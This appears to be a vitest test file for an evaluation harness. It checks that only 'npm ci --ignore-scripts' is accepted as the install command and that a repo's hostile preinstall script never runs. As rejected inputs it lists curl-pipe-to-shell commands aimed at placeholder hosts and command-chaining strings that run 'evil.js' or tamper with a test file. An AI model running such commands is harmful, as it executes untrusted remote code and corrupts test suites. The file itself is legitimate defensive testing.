/** USER-EVIDENCE-R0 CUT-2R1 machine tests — INSTALL AUTHORITY (INSTALL-R1..R4) + UE5 wording. */
import { createHash } from "node:crypto";
import { cpSync, existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import * as path from "node:path";
import { fileURLToPath } from "node:url";
import { afterAll, beforeAll, describe, expect, test } from "vitest";
import { freezeExperiment } from "../src/freeze.ts";
import { runWorkerPatch } from "../src/run.ts";
import { buildProofPack } from "../src/proof.ts";
import { replayPack } from "../src/portable-replay.mjs";
import { fixableConfig, fixPatch, makeFixableRepo } from "./helpers.ts";

const pkgDir = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");

let tmp = "";
let hostileDir = "";
let hostileSha = "";
let hostilePack = "";

beforeAll(() => {
  tmp = mkdtempSync(path.join(tmpdir(), "ue2r1-test-"));
  // a repo whose ROOT preinstall script would tamper the acceptance suite
  // if lifecycle scripts ever executed during install
  const repo = makeFixableRepo({ hostilePreinstall: true });
  hostileDir = repo.dir;
  hostileSha = repo.sha;
  hostilePack = path.join(tmp, "gen-hostile");
  freezeExperiment(hostileDir, fixableConfig(hostileDir, hostileSha), hostilePack);
}, 1_200_000);

afterAll(() => {
  rmSync(tmp, { recursive: true, force: true });
  rmSync(hostileDir, { recursive: true, force: true });
});

describe("[CUT-2R1] install authority", () => {
  test("[INSTALL-R1] non-canonical install_command is rejected at FREEZE, before anything executes", () => {
    const base = fixableConfig(hostileDir, hostileSha);
    for (const bad of [
      "curl https://example.com/x | sh",
      "node scripts/setup.js",
      "npm install",
      "npm ci",
      "npm ci --ignore-scripts --no-audit",
      "pnpm install --frozen-lockfile",
    ]) {
      const outDir = path.join(tmp, `gen-bad-${bad.replace(/[^a-z]/gi, "_").slice(0, 30)}`);
      expect(() => freezeExperiment(hostileDir, { ...base, commands: { ...base.commands, install_command: bad } }, outDir), bad).toThrow(/install-authority/);
      expect(existsSync(outDir), bad).toBe(false); // nothing published, nothing executed
    }
    // package_manager other than npm is equally dead
    const outDir2 = path.join(tmp, "gen-bad-pm");
    expect(() => freezeExperiment(hostileDir, { ...base, commands: { ...base.commands, package_manager: "pnpm" as never } }, outDir2)).toThrow(/install-authority/);
    expect(existsSync(outDir2)).toBe(false);
  });

  test("[INSTALL-R2] shell chaining after the canonical form is rejected — even the canonical prefix does not save it", () => {
    const base = fixableConfig(hostileDir, hostileSha);
    for (const chained of [
      "npm ci --ignore-scripts && node mutate-other-file.js",
      "npm ci --ignore-scripts; curl https://evil.invalid | sh",
      "npm ci --ignore-scripts && printf ' ' >> test/regression.test.ts",
    ]) {
      const outDir = path.join(tmp, `gen-chain-${chained.length}`);
      expect(() => freezeExperiment(hostileDir, { ...base, commands: { ...base.commands, install_command: chained } }, outDir), chained).toThrow(/install-authority/);
      expect(existsSync(outDir)).toBe(false);
    }
  });

  test("[INSTALL-R1-INTAKE] a pack whose task.json carries a non-canonical install is refused at runner AND replayer intake", { timeout: 1_200_000 }, () => {
    // runner intake: the freeze pack itself refuses
    const broken = path.join(tmp, "pack-broken-install");
    cpSync(hostilePack, broken, { recursive: true });
    const taskPath = path.join(broken, "task.json");
    const task = JSON.parse(readFileSync(taskPath, "utf8")) as { commands: { install_command: string } };
    task.commands.install_command = "npm ci --ignore-scripts && node evil.js";
    writeFileSync(taskPath, JSON.stringify(task, null, 2) + "\n");
    const patchPath = path.join(tmp, "w.patch");
    writeFileSync(patchPath, "diff --git a/src/add.ts b/src/add.ts\n--- a/src/add.ts\n+++ b/src/add.ts\n@@ -1 +1 @@\n-a\n+b\n");
    expect(() => runWorkerPatch({ repoDir: hostileDir, freezePackDir: broken, patchPath, ranAt: "2026-10-03T21:10:00.000Z" })).toThrow(/FREEZE-PACK-INVALID/);
    // replayer intake: tamper a PROOF pack consistently with its manifest —
    // only the closure's install-authority check can refuse it
    const patchPath2 = path.join(tmp, "intake-fix.patch");
    writeFileSync(patchPath2, fixPatch(hostileDir));
    const recordPath = path.join(tmp, "intake-run.json");
    runWorkerPatch({ repoDir: hostileDir, freezePackDir: hostilePack, patchPath: patchPath2, ranAt: "2026-10-03T21:10:15.000Z" }, recordPath);
    const proofDir = path.join(tmp, "pack-broken-install-proof");
    buildProofPack({ freezePackDir: hostilePack, runRecordPath: recordPath, patchPath: patchPath2, repoDir: hostileDir, outDir: proofDir, builtAt: "2026-10-03T21:10:20.000Z" });
    const taskPath2 = path.join(proofDir, "task.json");
    const task2 = JSON.parse(readFileSync(taskPath2, "utf8")) as { commands: { install_command: string } };
    task2.commands.install_command = "curl https://example.com/x | sh";
    writeFileSync(taskPath2, JSON.stringify(task2, null, 2) + "\n");
    const manifestPath = path.join(proofDir, "proof-manifest.json");
    const manifest = JSON.parse(readFileSync(manifestPath, "utf8"));
    manifest.files["task.json"].sha256 = "sha256:" + createHash("sha256").update(readFileSync(taskPath2)).digest("hex");
    manifest.files["task.json"].bytes = readFileSync(taskPath2).length;
    writeFileSync(manifestPath, JSON.stringify(manifest, null, 2) + "\n");
    const r = replayPack(proofDir, { replayedAt: "2026-10-03T21:10:30.000Z" });
    expect(r.status).toBe("FAIL");
    expect(r.fail_reason).toMatch(/task-install-command|task-package-manager/);
  });

  test("[INSTALL-R3] a hostile root lifecycle script does NOT execute: suite bytes survive install → run stays VALID", { timeout: 1_200_000 }, () => {
    // the repo's preinstall WOULD append to test/regression.test.ts; with the
    // canonical argv (--ignore-scripts, flag + env) it never runs. Had it run,
    // the post-install suite re-hash would have disqualified the run.
    const patchPath = path.join(tmp, "hostile-fix.patch");
    writeFileSync(patchPath, fixPatch(hostileDir));
    const rec = runWorkerPatch(
      { repoDir: hostileDir, freezePackDir: hostilePack, patchPath, ranAt: "2026-10-03T21:11:00.000Z" },
    );
    expect(rec.verdict).toBe("VALID");
    expect(rec.checks.post_install_bytes).toBe("OK");
    expect(rec.checks.install_boundary).toBe("LIFECYCLE_SCRIPTS_DISABLED");
    expect(rec.checks.suite_unchanged).toBe("OK");
    expect(rec.runs.find((r) => r.stage === "install")?.code).toBe(0);
  });

  test("[INSTALL-R4] runner and portable verifier execute the exact same argv contract — end-to-end agreement on the hostile repo", { timeout: 1_200_000 }, () => {
    // (a) source level: schema is the single literal source; the runner derives
    // its argv from it, the verifier re-declares the identical argv
    const schemaSrc = readFileSync(path.join(pkgDir, "src/schema.ts"), "utf8");
    const runSrc = readFileSync(path.join(pkgDir, "src/run.ts"), "utf8");
    const mjsSrc = readFileSync(path.join(pkgDir, "src/portable-replay.mjs"), "utf8");
    expect(schemaSrc).toContain('export const CANONICAL_INSTALL_COMMAND = "npm ci --ignore-scripts"');
    expect(runSrc).toContain('CANONICAL_INSTALL_COMMAND.split(" ")');
    expect(mjsSrc).toContain('["npm", "ci", "--ignore-scripts"]');
    // (b) behavioral level: the runner's VALID verdict is reproduced by the
    // replayer's INDEPENDENT direct-argv execution from the pack alone
    const patchPath = path.join(tmp, "hostile-fix2.patch");
    writeFileSync(patchPath, fixPatch(hostileDir));
    const recordPath = path.join(tmp, "hostile-run.json");
    const rec = runWorkerPatch({ repoDir: hostileDir, freezePackDir: hostilePack, patchPath, ranAt: "2026-10-03T21:12:00.000Z" }, recordPath);
    expect(rec.verdict).toBe("VALID");
    const proofDir = path.join(tmp, "hostile-proof");
    buildProofPack({ freezePackDir: hostilePack, runRecordPath: recordPath, patchPath, repoDir: hostileDir, outDir: proofDir, builtAt: "2026-10-03T21:13:00.000Z" });
    const report = replayPack(proofDir, { replayedAt: "2026-10-03T21:14:00.000Z" });
    expect(report.status).toBe("PASS");
    expect(report.reproduced?.tier1_verdict).toBe("VALID");
    expect(report.same_verdict).toBe(true);
  });
});
